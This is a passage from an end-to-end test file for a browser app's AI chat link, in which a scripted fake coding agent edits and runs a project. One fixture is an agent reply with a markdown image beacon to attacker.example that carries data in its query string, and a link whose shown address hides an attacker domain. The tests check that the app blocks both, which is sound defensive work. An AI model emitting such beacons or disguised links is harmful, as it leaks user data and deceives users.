import { spawn, type ChildProcess } from "node:child_process";
import { mkdir, mkdtemp, readFile, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";

import type { BrowserContext, Page } from "@playwright/test";
import { escapeRegExp } from "es-toolkit";

import { storeProjects } from "./data";
import { appOrigin, expect, test } from "./fixtures";
import { postSnapshot } from "./publish";
import { callStore } from "./store";

/**
 * The AI chat link end to end, headless: a real app tab pairs with the built companion
 * (`npx @drizzle-run/connect`) through the local relay Durable Object, and a scripted fake
 * agent (never a real Claude Code or Codex session) edits, waits for Keep, runs, and reads.
 */

interface ConnectHook {
  status(): { kind: string; secret?: string; connecting?: boolean; agent?: string };
  context(): {
    mode: string;
    pendingEdits: { id: string; files: { path: string }[] }[];
    activity: { kind: string; state?: string; text?: string; name?: string; status?: string }[];
  };
  openProject(): { id: string; name?: string; origin?: string } | undefined;
  send(event: Record<string, unknown>): void;
}

declare global {
  interface Window {
    __drizzleRunConnect?: ConnectHook;
  }
}

const CLI = resolve("packages/connect/dist/cli.js");
const FAKE_AGENT = resolve("packages/connect/test/fake-agent.mjs");
const PROJECT_ID = "00000000-0000-4000-8000-0000000c0e11";

const record = {
  version: 1,
  id: PROJECT_ID,
  name: "Connect transfers",
  createdAt: "2026-10-15T10:00:00.000Z",
  updatedAt: "2026-10-15T10:00:00.000Z",
  revision: 1,
  trust: "trusted" as const,
  manifest: {
    kind: "drizzle-run",
    manifestVersion: 1,
    target: { dialect: "sqlite" },
    dependencies: { "drizzle-orm": "0.45.4", "drizzle-kit": "0.31.11" },
    entrypoints: { schema: "schema.ts", run: "query.ts" },
    files: {
      "schema.ts":
        'import { sqliteTable, integer } from "drizzle-orm/sqlite-core";\n\nexport const items = sqliteTable("items", { id: integer("id").primaryKey() });\n',
      "query.ts": 'const amount = 100;\n$.display("Amount", { amount });\n',
    },
  },
};

const script = {
  byPrompt: {
    "Move 130": [
      { say: "Reading the project." },
      { call: "get_project" },
      {
        call: "apply_edits",
        args: {
          edits: [{ path: "query.ts", old_text: "const amount = 100;", new_text: "const amount = 130;" }],
          summary: "Move 130",
        },
      },
      { say: "Changed the amount; keep it to use it." },
    ],
    "Run it": [{ call: "run" }, { call: "get_latest_run" }, { say: "Ran it." }],
  },
};

/** The data of a tool result, read from inside its `<drizzle-run-data>` block. */
function readResultData(text: string | undefined): unknown {
  const lines = (text ?? "").split("\n");

  expect(lines[1]).toMatch(/^<drizzle-run-data nonce="[0-9a-f]{24}">$/);

  return JSON.parse(lines[2] ?? "null");
}

/** How many messages this browser keeps for a chat, read from the app's store. */
async function countStoredMessages(page: Page, conversation: string) {
  const history = await callStore(page, "readSetting", `chat:${conversation}`);
  const entries: unknown =
    history !== null && typeof history === "object" && "entries" in history ? history.entries : undefined;

  return Array.isArray(entries) ? entries.filter((entry) => entry?.kind === "user").length : 0;
}

/** Expose the AI chat's test hook on every app page the context opens; blank pages have no storage to write. */
function turnOnConnectDebug(context: BrowserContext) {
  return context.addInitScript(() => {
    if (location.protocol.startsWith("http")) {
      window.localStorage.setItem("drizzle-run:connect-debug", "1");
    }
  });
}

function getConnectHook(page: Page) {
  return {
    status: () => page.evaluate(() => window.__drizzleRunConnect?.status()),
    context: () => page.evaluate(() => window.__drizzleRunConnect?.context()),
    openProject: () => page.evaluate(() => window.__drizzleRunConnect?.openProject()),
    send: (event: Record<string, unknown>) => page.evaluate((sent) => window.__drizzleRunConnect?.send(sent), event),
  };
}

const PANEL_SCRIPT = {
  byPrompt: {
    "Move 130": [
      { call: "get_project" },
      {
        call: "apply_edits",
        args: {
          edits: [{ path: "query.ts", old_text: "const amount = 100;", new_text: "const amount = 130;" }],
          summary: "Move 130",
        },
      },
      { say: "Keep it to use 130." },
    ],
    "Take your time": [{ call: "read_file", args: { path: "query.ts" } }, { wait: 60_000 }],
  },
};

const GUIDED_SCRIPT = {
  byPrompt: {
    "Why does": [
      { call: "get_guide" },
      { call: "read_file", args: { path: "query.ts" } },
      { call: "read_docs", args: { url: "https://orm.drizzle.team/docs/transactions" } },
      { call: "apply_edits", args: { edits: [{ path: "query.ts", new_text: "x" }] } },
      { call: "run" },
      { say: "It is a savepoint inside the outer transaction." },
    ],
  },
};

const SNAPSHOT_SCRIPT = {
  byPrompt: {
    "Read the shared link": [
      { call: "get_project" },
      { call: "read_file", args: { path: "query.ts" } },
      {
        call: "apply_edits",
        args: { edits: [{ path: "query.ts", old_text: "const amount = 100;", new_text: "const amount = 130;" }] },
      },
      { call: "run" },
      { say: "It displays the amount." },
    ],
  },
};

const TRUST_SCRIPT = {
  byPrompt: {
    "Fork it for me": [{ call: "fork_project", args: { name: "AI fork" } }, { say: "Open your copy from the link." }],
    "Change and run it": [
      { call: "get_project" },
      {
        call: "apply_edits",
        args: { edits: [{ path: "query.ts", old_text: "const amount = 100;", new_text: "const amount = 130;" }] },
      },
      { call: "run" },
      { say: "I can only read it." },
    ],
    "Make it 130": [
      {
        call: "apply_edits",
        args: { edits: [{ path: "query.ts", old_text: "const amount = 100;", new_text: "const amount = 130;" }] },
      },
      { say: "Keep it to use 130." },
    ],
    "Run it": [{ call: "run" }, { call: "get_latest_run" }, { say: "Ran it." }],
  },
};

const OTHER_PROJECT_ID = "00000000-0000-4000-8000-0000000c0e12";

const otherRecord = { ...record, id: OTHER_PROJECT_ID, name: "Other transfers" };

const NAVIGATION_SCRIPT = {
  byPrompt: {
    "Edit it after I leave": [
      { call: "get_project" },
      { wait: 8_000 },
      { call: "read_file", args: { path: "query.ts" } },
      {
        call: "apply_edits",
        args: { edits: [{ path: "query.ts", old_text: "const amount = 100;", new_text: "const amount = 666;" }] },
      },
      { call: "run" },
      { say: "Done." },
    ],
  },
};

const DRAWING_REPLY = [
  "Here is the schema:",
  "",
  "```mermaid",
  "erDiagram",
  "  users ||--o{ posts : writes",
  "```",
  "",
  "![users table](https://attacker.example/beacon.png?d=users)",
  "",
  "See [https://orm.drizzle.team](https://drizzle-team.attacker.example/login).",
].join("\n");

const DRAWING_SCRIPT = { byPrompt: { "Draw the schema": [{ say: DRAWING_REPLY }] } };

const STREAMED_SENTENCES = Array.from(
  { length: 12 },
  (_, index) => `Sentence ${index + 1} explains how the users table relates to posts and comments. `,
);
const STREAMED_SCRIPT = {
  byPrompt: {
    "Explain slowly": STREAMED_SENTENCES.flatMap((sentence) => [{ say: sentence }, { wait: 150 }]),
  },
};

const EFFECT_QUERY = [
  'import * as Effect from "effect/Effect";',
  'import * as LibsqlClient from "@effect/sql-libsql/LibsqlClient";',
  'import * as LibsqlDrizzle from "drizzle-orm/effect-libsql";',
  'import { db } from "@drizzle-run/runtime/context";',
  'import { items } from "./schema";',
  "",
  "const program = Effect.gen(function* () {",
  "  const effectDb = yield* LibsqlDrizzle.makeWithDefaults();",
  "  return yield* effectDb.select().from(items);",
  "});",
  "",
  '$.display("Items", await Effect.runPromise(program.pipe(Effect.provide(LibsqlClient.layer({ liveClient: db.$client })))));',
  "",
].join("\n");

const CREATE_SCRIPT = {
  byPrompt: {
    "Start an Effect project": [
      {
        call: "create_project",
        args: {
          name: "Effect items",
          dialect: "sqlite",
          orm_version: "1.0.0-rc.5",
          guest_flavor: "effect",
          files: { "schema.ts": record.manifest.files["schema.ts"], "query.ts": EFFECT_QUERY },
        },
      },
      { call: "get_project" },
      { say: "Open it from the link." },
    ],
  },
};

const TWO_TABS_SCRIPT = {
  byPrompt: {
    "Make it 130": [
      { call: "get_project" },
      { wait: 1_500 },
      {
        call: "apply_edits",
        args: { edits: [{ path: "query.ts", old_text: "const amount = 100;", new_text: "const amount = 130;" }] },
      },
      { call: "run" },
      { say: "Bank is on 130." },
    ],
    "Make it 200": [
      { call: "get_project" },
      { wait: 1_500 },
      {
        call: "apply_edits",
        args: { edits: [{ path: "query.ts", old_text: "const amount = 100;", new_text: "const amount = 200;" }] },
      },
      { call: "run" },
      { say: "Shop is on 200." },
    ],
  },
};

const DOCS_PAGE =
  "<!doctype html><html><body><nav>Docs menu</nav><main><h1>Transactions</h1><p>Nested transactions are savepoints.</p></main></body></html>";

/** Waits until the playground can run, or skips in a browser that cannot run projects. */
async function waitForRun(page: Page) {
  const run = page.getByRole("button", { name: /^Run/ }).first();
  const incompatible = page.getByText(/can't run in this browser/);

  await expect
    .poll(async () => ((await run.count()) > 0 && (await run.isEnabled())) || (await incompatible.isVisible()), {
      timeout: 120_000,
    })
    .toBe(true);
  test.skip(await incompatible.isVisible(), "This browser cannot run projects.");
}

const sessionOf = (argv: string[]) => argv[argv.indexOf("--session-id") + 1];

test.describe("AI chat link", () => {
  let scratch: string;
  let companion: ChildProcess | undefined;
  let output = "";

  /** The built companion with the fake agent as `claude` (and `codex` when asked), in a temp home and PATH. */
  const startCompanion = async (
    secret: string,
    agentScript: unknown,
    agentEnv: Record<string, string> = {},
    { agents = ["claude"], args = [] }: { agents?: readonly ("claude" | "codex")[]; args?: readonly string[] } = {},
  ) => {
    const bin = join(scratch, "bin");
    const scriptPath = join(scratch, "script.json");

    await mkdir(bin, { recursive: true });

    for (const agent of agents) {
      await symlink(FAKE_AGENT, join(bin, agent));
    }

    await symlink(process.execPath, join(bin, "node"));
    await writeFile(scriptPath, JSON.stringify(agentScript));

    companion = spawn(process.execPath, [CLI, secret, "--relay", appOrigin, ...args], {
      env: {
        ...process.env,
        DRIZZLE_RUN_HOME: join(scratch, "home"),
        PATH: `${bin}:/usr/bin:/bin`,
        FAKE_AGENT_SCRIPT: scriptPath,
        FAKE_AGENT_LOG: join(scratch, "agent.log"),
        ...agentEnv,
      },
      stdio: ["ignore", "pipe", "pipe"],
    });
    companion.stdout?.on("data", (chunk: Buffer) => {
      output += chunk.toString();
    });
    companion.stderr?.on("data", (chunk: Buffer) => {
      output += chunk.toString();
    });
  };
  const readAgentLog = async () => {
    const log = await readFile(join(scratch, "agent.log"), "utf8").catch(() => "");

    return log
      .split("\n")
      .filter((line) => line !== "")
      .map(
        (line) =>
          JSON.parse(line) as {
            argv: string[];
            prompt: string;
            tools: string[];
            results: { name: string; isError: boolean; text: string }[];
          },
      );
  };
  // The fake agent logs a turn as it exits, after its reply shows, so a read waits for the turns the test sent.
  const agentLog = async (turns: number) => {
    await expect.poll(async () => (await readAgentLog()).length, { timeout: 30_000 }).toBeGreaterThanOrEqual(turns);

    return readAgentLog();
  };

  test.beforeEach(async () => {
    scratch = await mkdtemp(join(tmpdir(), "drizzle-run-connect-e2e-"));
  });

  test.afterEach(async () => {
    companion?.kill("SIGINT");
    companion = undefined;
    output = "";
    await rm(scratch, { recursive: true, force: true });
  });

  test("should pair a scripted agent with the open tab that edits, waits for Keep on the edit, then runs and reads the result", async ({
    page,
    context,
  }) => {
    await turnOnConnectDebug(context);
    await storeProjects(page, [record], "/projects");
    await page.goto(`/p/${PROJECT_ID}`);

    const run = page.getByRole("button", { name: "Run", exact: true });
    const incompatible = page.getByText(/can't run in this browser/);
    await expect
      .poll(async () => ((await run.count()) > 0 && (await run.isEnabled())) || (await incompatible.isVisible()), {
        timeout: 120_000,
      })
      .toBe(true);
    test.skip(await incompatible.isVisible(), "This browser cannot run projects.");

    const tab = getConnectHook(page);

    await expect.poll(() => tab.status().then((status) => status?.kind)).toBe("unpaired");
    await tab.send({ type: "pairing.create" });
    await expect.poll(() => tab.status()).toMatchObject({ kind: "pairing", connecting: false });

    const secret = (await tab.status())?.secret;

    expect(secret).toMatch(/^[A-Za-z0-9]{4}-[A-Za-z0-9]{4}-[A-Za-z0-9]{4}$/);

    const bin = join(scratch, "bin");
    const home = join(scratch, "home");
    const scriptPath = join(scratch, "script.json");
    const log = join(scratch, "agent.log");

    await mkdir(bin);
    await symlink(FAKE_AGENT, join(bin, "claude"));
    await symlink(process.execPath, join(bin, "node"));
    await writeFile(scriptPath, JSON.stringify(script));

    companion = spawn(process.execPath, [CLI, secret ?? "", "--relay", appOrigin], {
      env: {
        ...process.env,
        DRIZZLE_RUN_HOME: home,
        PATH: `${bin}:/usr/bin:/bin`,
        FAKE_AGENT_SCRIPT: scriptPath,
        FAKE_AGENT_LOG: log,
      },
      stdio: ["ignore", "pipe", "pipe"],
    });
    companion.stdout?.on("data", (chunk: Buffer) => {
      output += chunk.toString();
    });
    companion.stderr?.on("data", (chunk: Buffer) => {
      output += chunk.toString();
    });

    await expect
      .poll(() => tab.status(), { timeout: 30_000, message: output })
      .toMatchObject({ kind: "ready", agent: "claude" });
    expect(JSON.parse(await readFile(join(home, "connect.json"), "utf8"))).toMatchObject({
      secret,
      relay: appOrigin,
    });

    await tab.send({ type: "chat.mode.set", mode: "edit" });
    await tab.send({
      type: "chat.message.send",
      conversation: PROJECT_ID,
      text: "Move 130 instead",
      project: { id: PROJECT_ID, name: record.name },
    });

    await expect
      .poll(() => tab.context().then((state) => state?.pendingEdits.length), { timeout: 30_000, message: output })
      .toBe(1);
    await expect(page.locator(".monaco-editor .view-lines")).toContainText("const amount = 130;");

    const [edit] = (await tab.context())?.pendingEdits ?? [];

    expect(edit?.files.map((file) => file.path)).toEqual(["query.ts"]);
    await tab.send({ type: "edit.keep", id: edit?.id });
    await expect.poll(() => tab.context().then((state) => state?.pendingEdits.length)).toBe(0);
    await expect
      .poll(
        () =>
          tab
            .context()
            .then((state) => state?.activity.filter((entry) => entry.kind === "turn" && entry.state === "done").length),
        { timeout: 30_000 },
      )
      .toBe(1);

    await tab.send({
      type: "chat.message.send",
      conversation: PROJECT_ID,
      text: "Run it",
      project: { id: PROJECT_ID, name: record.name },
    });
    await expect
      .poll(
        () =>
          tab
            .context()
            .then((state) => state?.activity.filter((entry) => entry.kind === "turn" && entry.state === "done").length),
        { timeout: 180_000, message: output },
      )
      .toBe(2);
    await expect(page.getByRole("region", { name: "Execution output" }).getByRole("status")).toHaveText(/^Succeeded/);
    await expect(
      page.getByRole("region", { name: "Execution output" }).getByText("Started by Claude Code"),
    ).toBeVisible();

    const turns = (await readFile(log, "utf8"))
      .trim()
      .split("\n")
      .map((line) => JSON.parse(line) as { cwd: string; results: { name: string; isError: boolean; text: string }[] });
    const [editTurn, runTurn] = turns;

    expect(editTurn?.results.map((item) => [item.name, item.isError])).toEqual([
      ["get_project", false],
      ["apply_edits", false],
    ]);
    expect(readResultData(editTurn?.results[1]?.text)).toMatchObject({
      files: [{ path: "query.ts", added: 1, removed: 1 }],
    });
    expect(runTurn?.results.map((item) => [item.name, item.isError])).toEqual([
      ["run", false],
      ["get_latest_run", false],
    ]);

    const latest = readResultData(runTurn?.results[1]?.text) as {
      outcome: string;
      displays: { label: string; values: unknown[] }[];
    };

    expect(latest.outcome).toBe("succeeded");
    expect(latest.displays).toEqual([expect.objectContaining({ label: "Amount", values: [{ amount: 130 }] })]);
    expect(await tab.context().then((state) => state?.activity.find((entry) => entry.kind === "text")?.text)).toContain(
      "Reading the project.",
    );

    await run.click();
    await expect(page.getByRole("region", { name: "Execution output" }).getByRole("status")).toHaveText(/^Succeeded/, {
      timeout: 60_000,
    });
    await expect(
      page.getByRole("region", { name: "Execution output" }).getByText("Started by Claude Code"),
    ).toHaveCount(0);
  });

  test("should walk the chat dock: setup, ready, Ask then Edit, a pending edit with a refused Undo and Keep, Stop, Disconnect and Reconnect, the history after a reload, and a stopped companion", async ({
    page,
    context,
  }) => {
    await turnOnConnectDebug(context);
    await storeProjects(page, [record], "/projects");
    await page.goto(`/p/${PROJECT_ID}`);
    await waitForRun(page);

    const toggle = page.getByRole("button", { name: /Ask AI/ });
    const panel = page.getByRole("region", { name: "AI chat" });

    await expect(toggle).toHaveAttribute("aria-pressed", "false");
    await toggle.click();
    await expect(toggle).toHaveAttribute("aria-pressed", "true");

    await expect(panel.getByRole("heading", { name: "Chat with your coding agent" })).toBeVisible();
    await expect(panel.getByRole("status").first()).toHaveText("Not connected");

    const command = panel.locator("[data-slot=command]");
    await expect(command.locator("code")).toHaveText(
      new RegExp(
        `^node packages/connect/dist/cli\\.js [A-Za-z0-9]{4}-[A-Za-z0-9]{4}-[A-Za-z0-9]{4} --relay ${escapeRegExp(appOrigin)}$`,
      ),
    );
    await expect(panel.locator("[data-slot=local-command]")).toContainText(
      "run it from the root of your Drizzle Run checkout",
    );

    const secret = (await getConnectHook(page).status())?.secret ?? "";

    await expect(command.locator("b")).toHaveText(secret);
    await startCompanion(secret, PANEL_SCRIPT);

    await expect(panel.getByText("Connected · this project only")).toBeVisible({ timeout: 30_000 });
    await expect(panel.getByRole("heading", { name: "Ask about Connect transfers" })).toBeVisible();
    await expect(panel.getByText("Claude Code sees schema.ts, query.ts, and your latest run.")).toBeVisible();

    const message = panel.getByRole("textbox", { name: "Message to the agent" });
    const mode = panel.getByRole("group", { name: "Mode" });

    await expect(mode.getByRole("button", { name: "Ask" })).toHaveAttribute("aria-pressed", "true");
    await expect(panel.getByText("Ask reads and runs. It never edits.")).toBeVisible();

    const quota = panel.locator("[data-slot=chat-quota]");

    await expect(quota).toHaveText(/^\d{1,2}% of today's AI chat used$/);
    await quota.getByRole("button", { name: "What the daily AI chat limit is" }).click();

    const quotaHelp = page.getByRole("dialog", { name: "Daily AI chat limit" });

    await expect(quotaHelp).toContainText("To keep Drizzle Run free, each connection gets a daily amount of AI chat.");
    await expect(quotaHelp).toContainText(/It resets at \d\d:\d\d, your time\./);
    await expect(quotaHelp).toContainText("Your link code and messages stay end-to-end encrypted.");
    await page.keyboard.press("Escape");
    await expect(quotaHelp).toBeHidden();

    await panel.getByRole("button", { name: "Agent, model and effort: Claude Code, Opus · Medium" }).click();
    await page.getByRole("menuitemradio", { name: "Sonnet" }).click();
    await panel.getByRole("button", { name: "Agent, model and effort: Claude Code, Sonnet · Medium" }).click();
    await page.getByRole("menuitemradio", { name: "High", exact: true }).click();
    await expect(
      panel.getByRole("button", { name: "Agent, model and effort: Claude Code, Sonnet · High" }),
    ).toBeVisible();

    await message.fill("Move 130 instead");
    await message.press("Enter");
    await expect(panel.locator("[data-slot=user-message]")).toHaveText("Move 130 instead");
    await expect(panel.locator("[data-slot=tool-row]").first()).toContainText("Read the project");
    await expect(panel.getByText("This needs an edit to query.ts")).toBeVisible({ timeout: 30_000 });

    const firstTurn = (await agentLog(1))[0]?.argv ?? [];

    expect(firstTurn[firstTurn.indexOf("--model") + 1]).toBe("sonnet");
    expect(firstTurn[firstTurn.indexOf("--effort") + 1]).toBe("high");
    await expect(
      panel.getByText("You're in Ask mode: Claude Code can read and run this project, not change it."),
    ).toBeVisible();
    await panel.getByRole("button", { name: "Allow edits in this chat" }).click();
    await expect(panel.getByText("Edits allowed in this chat. Each one still waits for Keep or Undo.")).toBeVisible();
    await expect(mode.getByRole("button", { name: "Edit" })).toHaveAttribute("aria-pressed", "true");
    await expect(message).toHaveAttribute("placeholder", "Ask about this project, or ask for a change", {
      timeout: 30_000,
    });

    await message.fill("Move 130 now");
    await message.press("Enter");

    const bar = panel.locator("[data-slot=pending-bar]");
    const banner = page.locator("[data-slot=pending-edit-banner]");

    await expect(bar).toContainText("1 pending edit query.ts +1 −1", { timeout: 30_000 });
    await expect(banner).toContainText("Claude Code edited");
    await expect(page.getByRole("tab", { name: /query\.ts/ }).getByText("Pending edit")).toBeVisible();
    await expect(page.locator(".monaco-editor .view-lines")).toContainText("const amount = 130;");
    await expect(panel.locator("[data-slot=tool-row]").filter({ hasText: "Edited" }).last()).toContainText("pending");

    await page.locator(".monaco-editor .view-lines").click();
    await page.keyboard.press("ControlOrMeta+End");
    await page.keyboard.insertText("\n// mine\n");
    await bar.getByRole("button", { name: "Undo" }).click();
    await expect(bar.getByRole("alert")).toContainText("Undo was refused: query.ts changed since this edit.");
    await expect(banner.getByRole("alert")).toContainText("Undo was refused");
    await bar.getByRole("button", { name: "Keep" }).click();
    await expect(bar).toHaveCount(0);
    await expect(banner).toHaveCount(0);
    await expect(panel.locator("[data-slot=tool-row]").filter({ hasText: "Edited" }).last()).toContainText("kept");

    await expect(panel.getByRole("button", { name: "Stop the agent" })).toHaveCount(0, { timeout: 30_000 });
    await message.fill("Take your time");
    await message.press("Enter");
    await expect(message).toHaveAttribute("placeholder", "Claude Code is working");
    await panel.getByRole("button", { name: "Stop the agent" }).click();
    await expect(panel.getByText("Stopped.")).toBeVisible({ timeout: 30_000 });

    await panel.getByRole("button", { name: "Disconnect" }).click();
    await expect(panel.getByRole("status").first()).toHaveText("Disconnected");
    await expect(panel.getByText("You disconnected this tab")).toBeVisible();
    await expect(message).toBeDisabled();
    await expect(panel.getByRole("button", { name: "Disconnect" })).toHaveCount(0);
    await page.evaluate(() => window.dispatchEvent(new Event("focus")));
    await expect(panel.getByRole("status").first()).toHaveText("Disconnected");
    await panel.getByRole("button", { name: "Reconnect" }).click();
    await expect(panel.getByText("Connected · this project only")).toBeVisible({ timeout: 30_000 });
    await expect(message).toBeEnabled();

    await expect(page.getByText("Saved in this browser")).toBeVisible();
    await expect.poll(() => countStoredMessages(page, `p-${PROJECT_ID}`)).toBe(3);
    await page.reload();
    await expect(panel.locator("[data-slot=user-message]")).toHaveText(
      ["Move 130 instead", "Move 130 now", "Take your time"],
      { timeout: 60_000 },
    );
    await expect(panel.getByText("Connected · this project only")).toBeVisible({ timeout: 30_000 });
    await expect(mode.getByRole("button", { name: "Edit" })).toHaveAttribute("aria-pressed", "true");

    companion?.kill("SIGINT");
    await expect(panel.getByText("Companion stopped", { exact: true })).toBeVisible({ timeout: 30_000 });
    await expect(panel.getByText("The companion stopped")).toBeVisible();
    await expect(message).toBeDisabled();
    await expect(message).toHaveAttribute("placeholder", "Not connected");

    await panel.getByRole("button", { name: "Close chat" }).click();
    await expect(panel).toHaveCount(0);
  });

  test("should not make a new link code on its own after Forget, even when the dock opens again", async ({
    page,
    context,
  }) => {
    await turnOnConnectDebug(context);
    await storeProjects(page, [record], "/projects");
    await page.goto(`/p/${PROJECT_ID}`);
    await waitForRun(page);

    const tab = getConnectHook(page);
    const toggle = page.getByRole("button", { name: /Ask AI/ });
    const panel = page.getByRole("region", { name: "AI chat" });

    await toggle.click();
    await expect(panel.locator("[data-slot=command]")).toBeVisible();
    await tab.send({ type: "pairing.forget" });
    await expect(panel.getByRole("button", { name: "New link code" })).toBeVisible();

    await panel.getByRole("button", { name: "Close chat" }).click();
    await toggle.click();

    await expect(panel.getByRole("button", { name: "New link code" })).toBeVisible();
    expect(await tab.status()).toEqual({ kind: "unpaired", reason: "forgotten" });

    await panel.getByRole("button", { name: "New link code" }).click();
    await expect(panel.locator("[data-slot=command]")).toBeVisible();
  });

  test("should stop a chat's turn when the user opens another project, before it reaches the new one", async ({
    page,
    context,
  }) => {
    await turnOnConnectDebug(context);
    await storeProjects(page, [record, otherRecord], "/projects");
    await page.goto(`/p/${PROJECT_ID}`);
    await waitForRun(page);

    const tab = getConnectHook(page);
    const calls = join(scratch, "calls.log");
    const readCalls = async () =>
      (await readFile(calls, "utf8").catch(() => ""))
        .trim()
        .split("\n")
        .filter(Boolean)
        .map((line) => JSON.parse(line) as { name: string; isError: boolean; text: string });

    await tab.send({ type: "pairing.create" });
    await expect.poll(() => tab.status()).toMatchObject({ kind: "pairing", connecting: false });
    await startCompanion((await tab.status())?.secret ?? "", NAVIGATION_SCRIPT, { FAKE_AGENT_CALLS: calls });
    await expect
      .poll(() => tab.status(), { timeout: 30_000, message: output })
      .toMatchObject({ kind: "ready", agent: "claude" });

    const conversation = `p-${PROJECT_ID}`;

    await tab.send({ type: "chat.mode.set", mode: "edit", conversation });
    await tab.send({
      type: "chat.message.send",
      conversation,
      text: "Edit it after I leave",
      project: { id: PROJECT_ID, name: record.name },
    });
    await expect
      .poll(() => readCalls().then((list) => list.map((call) => call.name)), { timeout: 30_000, message: output })
      .toEqual(["get_project"]);

    await page.getByRole("button", { name: "Switch project" }).click();
    await page.getByRole("button", { name: /Other transfers/ }).click();
    await expect(page).toHaveURL(new RegExp(`/p/${OTHER_PROJECT_ID}$`));
    await expect
      .poll(
        () =>
          tab
            .context()
            .then(
              (state) => state?.activity.find((entry) => entry.kind === "turn" && entry.state !== "started")?.state,
            ),
        { timeout: 30_000, message: output },
      )
      .toBe("stopped");

    await page.waitForTimeout(10_000);
    expect((await readCalls()).map((call) => call.name)).toEqual(["get_project"]);
    expect((await tab.context())?.pendingEdits).toEqual([]);
    await expect(page.locator(".monaco-editor .view-lines")).toContainText("const amount = 100;");
    await expect(
      page.getByRole("region", { name: "Execution output" }).getByText("Started by Claude Code"),
    ).toHaveCount(0);
  });

  test("should move a chat to another agent with the chat so far, keep each chat on its own pick, and start a new chat on the last pick", async ({
    page,
    context,
  }) => {
    await turnOnConnectDebug(context);
    await storeProjects(page, [record, { ...record, id: "connect-other", name: "Other transfers" }], "/projects");
    await page.goto(`/p/${PROJECT_ID}`);
    await waitForRun(page);

    const panel = page.getByRole("region", { name: "AI chat" });

    await page.getByRole("button", { name: /Ask AI/ }).click();
    await expect
      .poll(() =>
        getConnectHook(page)
          .status()
          .then((status) => status?.kind),
      )
      .toBe("pairing");
    await startCompanion(
      (await getConnectHook(page).status())?.secret ?? "",
      [{ say: "Hello." }],
      {},
      { agents: ["claude", "codex"], args: ["--agent", "claude"] },
    );
    await expect(panel.getByText("Connected · this project only")).toBeVisible({ timeout: 30_000 });

    const message = panel.getByRole("textbox", { name: "Message to the agent" });
    const send = async (text: string, answers: number) => {
      await message.fill(text);
      await message.press("Enter");
      await expect(panel.getByText("Hello.")).toHaveCount(answers, { timeout: 30_000 });
    };

    await panel.getByRole("button", { name: "Agent, model and effort: Claude Code, Opus · Medium" }).click();
    await page.getByRole("menuitemradio", { name: "High", exact: true }).click();
    await send("First question", 1);

    await panel.getByRole("button", { name: "Agent, model and effort: Claude Code, Opus · High" }).click();
    await page.getByRole("menuitemradio", { name: "Codex" }).click();
    await expect(
      panel.getByRole("button", { name: "Agent, model and effort: Codex, GPT-6 Luna · Medium" }),
    ).toBeVisible();
    await expect(panel.locator("b").first()).toHaveText("Codex");
    await send("Second question", 2);
    await send("Third question", 3);

    const [first, second, third] = await agentLog(3);

    expect(first?.argv).toEqual(expect.arrayContaining(["--model", "opus", "--effort", "high"]));
    expect(second?.argv.slice(0, 2)).toEqual(["exec", "--json"]);
    expect(second?.argv).toEqual(expect.arrayContaining(["--model", "gpt-6-luna", 'model_reasoning_effort="medium"']));
    expect(second?.prompt).toContain('{"from":"user","text":"First question"}\n{"from":"agent","text":"Hello."}');
    expect(third?.argv.slice(0, 2)).toEqual(["exec", "resume"]);
    expect(third?.prompt).not.toContain("Earlier in this chat");

    await page.goto("/p/connect-other");
    await expect(
      panel.getByRole("button", { name: "Agent, model and effort: Codex, GPT-6 Luna · Medium" }),
    ).toBeVisible({
      timeout: 30_000,
    });
    await panel.getByRole("button", { name: "Agent, model and effort: Codex, GPT-6 Luna · Medium" }).click();
    await page.getByRole("menuitemradio", { name: "High", exact: true }).click();
    await page.goto(`/p/${PROJECT_ID}`);
    await expect(
      panel.getByRole("button", { name: "Agent, model and effort: Codex, GPT-6 Luna · Medium" }),
    ).toBeVisible({
      timeout: 30_000,
    });
  });

  test("should draw a reply's mermaid diagram, show its remote image as a link, and never load that image", async ({
    page,
    context,
  }) => {
    await turnOnConnectDebug(context);

    const remoteRequests: string[] = [];

    page.on("request", (request) => {
      if (request.url().includes("attacker.example")) {
        remoteRequests.push(request.url());
      }
    });
    await storeProjects(page, [record], "/projects");
    await page.goto(`/p/${PROJECT_ID}`);
    await waitForRun(page);

    const panel = page.getByRole("region", { name: "AI chat" });

    await page.getByRole("button", { name: /Ask AI/ }).click();
    await expect
      .poll(() =>
        getConnectHook(page)
          .status()
          .then((status) => status?.kind),
      )
      .toBe("pairing");
    await startCompanion((await getConnectHook(page).status())?.secret ?? "", DRAWING_SCRIPT);
    await expect(panel.getByText("Connected · this project only")).toBeVisible({ timeout: 30_000 });

    const message = panel.getByRole("textbox", { name: "Message to the agent" });

    await message.fill("Draw the schema");
    await message.press("Enter");

    const diagram = panel.locator("[data-slot=chat-diagram][data-state=drawn] img");

    await expect(diagram).toBeVisible({ timeout: 30_000 });
    expect(await diagram.getAttribute("src")).toMatch(/^data:image\/svg\+xml;charset=utf-8,/);
    expect(await diagram.evaluate((image: HTMLImageElement) => image.complete && image.naturalWidth > 0)).toBe(true);

    const remoteImage = panel.locator("[data-slot=remote-image]");

    await expect(remoteImage).toHaveText("users table");
    await expect(remoteImage).toHaveAttribute("href", "https://attacker.example/beacon.png?d=users");
    await expect(panel.locator("[data-slot=link-destination]")).toHaveText([
      "· attacker.example",
      "· drizzle-team.attacker.example",
    ]);
    await expect(panel.locator("img[src*='attacker.example']")).toHaveCount(0);
    expect(remoteRequests).toEqual([]);

    const violations = await page.evaluate(() => {
      const blocked: string[] = [];

      document.addEventListener("securitypolicyviolation", (event) => blocked.push(event.effectiveDirective));

      const image = new Image();

      image.src = "https://attacker.example/csp-probe.png";

      return fetch("https://attacker.example/csp-probe").then(
        () => blocked,
        () => new Promise<string[]>((resolveBlocked) => setTimeout(() => resolveBlocked(blocked), 500)),
      );
    });

    expect(violations.toSorted()).toEqual(["connect-src", "img-src"]);
  });

  test("should reveal a streamed answer word by word between batches, end on the whole answer, and keep it in view", async ({
    page,
    context,
  }) => {
    await turnOnConnectDebug(context);
    await page.emulateMedia({ reducedMotion: "no-preference" });
    await storeProjects(page, [record], "/projects");
    await page.goto(`/p/${PROJECT_ID}`);
    await waitForRun(page);

    const panel = page.getByRole("region", { name: "AI chat" });

    await page.getByRole("button", { name: /Ask AI/ }).click();
    await expect
      .poll(() =>
        getConnectHook(page)
          .status()
          .then((status) => status?.kind),
      )
      .toBe("pairing");
    await startCompanion((await getConnectHook(page).status())?.secret ?? "", STREAMED_SCRIPT);
    await expect(panel.getByText("Connected · this project only")).toBeVisible({ timeout: 30_000 });

    await page.evaluate(() => {
